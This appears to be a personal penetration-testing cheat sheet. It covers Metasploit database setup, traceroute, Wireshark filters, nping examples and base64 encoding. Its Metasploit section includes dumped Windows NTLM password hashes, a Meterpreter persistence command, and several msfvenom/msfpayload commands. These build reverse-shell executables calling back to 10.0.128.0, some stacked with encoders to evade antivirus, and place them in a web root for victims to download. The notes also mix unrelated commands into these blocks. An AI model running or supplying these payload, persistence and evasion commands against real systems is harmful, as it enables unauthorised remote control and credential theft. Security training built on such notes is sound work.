# rules
  * no harm
  * defiine and honor boundaries
  * consider contermeasures only after haking is complete
  * get  agreement in advance
  * document everything

# start postgres db
  * Metasploit uses PostgreSQL as its database so it needs to be launched first.
    ```
      service postgresql start
      ** You can verify that PostgreSQL is running by checking the output of ss -ant and making sure that port 5432 is listening.

      State Recv-Q Send-Q Local Address:Port Peer Address:Port
      LISTEN 0 128 :::22 :::*
      LISTEN 0 128 *:22 *:*
      LISTEN 0 128 127.0.0.1:5432 *:*
      LISTEN 0 128 ::1:5432 :::*
    ```
  * Initialise the Metasploit PostgreSQL Database

      With PostgreSQL up and running, we next need to create and initialize the msf database.
      ```
      pg_ctl init -D /var/db/postgresql/defaultdb/
      pg_ctl -D /var/db/postgresql/defaultdb -l /var/db/postgresql/defaultdb/logfile start
      su - postgres -c "pg_ctl -D /var/db/postgresql/defaultdb/ start"

      psql
      create user root;
      create database ms;

      msfdb init
      ```
  * Launch msfconsole in Kali

    Now that the PostgreSQL service is up and running and the database is initialized, you can launch msfconsole and verify database connectivity with the db_status command as shown below.
    ```
    msfconsole
    msf > db_status
    [*] postgresql connected to msf3
    msf >

    umount -a -t cifs -l

    apt-cdrom -d=/dev/sr0 add

    traceroute www.google.com 
      -f 8   //ttl
      -w 2   //wait time
      -q 4   // query count
      -n     // not use hostname,use ip address instead
     ```
  * wireshare
      ip.src == 192.168.11.1
      udp.port==68 or udp.port==67


  * Metasploit
      [-] Meterpreter Exception: Rex::Post::Meterpreter::RequestError stdapi_registry_open_key: Operation failed: Access is denied.
      [-] This script requires the use of a SYSTEM user context (hint: migrate into service process)
         find a system process get pid
         migrate pid

    Administrator:500:c0ad129bd4e0e675ab0b09b894a430a5:64f2a499e4fc2846acfaa3c2381ed559:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    HelpAssistant:1000:bc156931ebe3fa457e2260fe8b464b5c:04d8217f38d4aab7c2ad9ee56ed93b01:::
    SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:2f99608b6d63ec34d85538bdef5916e1:::

    [*] Authenticating to 10.0.128.4:445|WORKGROUP as user 'Administrator'...
    
    [-] FAILED! The remote host has only provided us with Guest privileges. 
        Please make sure that the correct username and password have been provided. 
        Windows XP systems that are not part of a domain will only provide Guest privileges to network logins by default.

    * run scraper
      > timeout
    * pessistent:
      > run persistence -X -i 50 -p 443 -r ip
        
    * payload:  
    ```  
      msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.128.0 lport=31337 -f exe -o /var/www/payload1.exe

      msfpayload windows/meterpreter/reverse_tcp lhost=10.0.128.0 lport=33134 X > /var/www/payload1.exe

      msfpayload windows/shell_reverse_tcp lhost=10.0.128.0 lport=33134 R | msfencode -e x86/shikata_ga_nai -t exe > /var/www/payload2.exe 

       msfpayload windows/meterpreter/reverse_tcp lhost=10.0.128.0 lport=33134 R | msfencode -e x86/shikata_ga_nai -c 5 -t raw | msfencode -e x86/alpha_upper -c 2 -t raw | msfencode -e x86/shikata_ga_nai -t raw -c 5 | \
        msfencode -e x86/countdown -c 5 -t exe -o /var/www/payload3.exe
      ```

  * Nping 0.7.30 ( https://nmap.org/nping )
    EXAMPLES:
    ```
      nping scanme.nmap.org
      nping --tcp -p 80 --flags rst --ttl 2 192.168.1.1
      nping --icmp --icmp-type time --delay 500ms 192.168.254.254
      nping --echo-server "public" -e wlan0 -vvv
      nping --echo-client "public" echo.nmap.org --tcp -p1-1024 --flags ack
    ```
    SEE THE MAN PAGE FOR MANY MORE OPTIONS, DESCRIPTIONS, AND EXAMPLES
    ```
    nping --arp --arp-type arp-reply --arp-sender-mac a1:8f:16:54:c2:38 --arp-sender-ip 192.168.43.1 --arp-target-mac 84:4b:f5:85:91:8e --arp-target-ip 192.168.43.206 192.168.43.206
    echo "this is a test from all of you" |  ncat -u 127.0.0.1 4913
    ```

* rce
  arbitrary code execution

* base64:
  ```
  Text content 	M 	a 	n
  ASCII 	77 (0x4d) 	97 (0x61) 	110 (0x6e)
  Bit pattern 	0 	1 	0 	0 	1 	1 	0 	1 	0 	1 	1 	0 	0 	0 	0 	1 	0 	1 	1 	0 	1 	1 	1 	0
  Index 	19 	22 	5 	46
  Base64-encoded 	T 	W 	F 	u
  ```
  As this example illustrates, Base64 encoding converts three octets into four encoded characters.
  When the number of bytes to encode is not divisible by three, Add extra bytes with value zero 
  ```
  Text content 	M 		
  ASCII 	77 (0x4d) 	0 (0x00) 	0 (0x00)
  Bit pattern 	0 	1 	0 	0 	1 	1 	0 	1 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0
  Index 	19 	16 	0 	0
  Base64-encoded 	T 	Q 	= 	=
  ```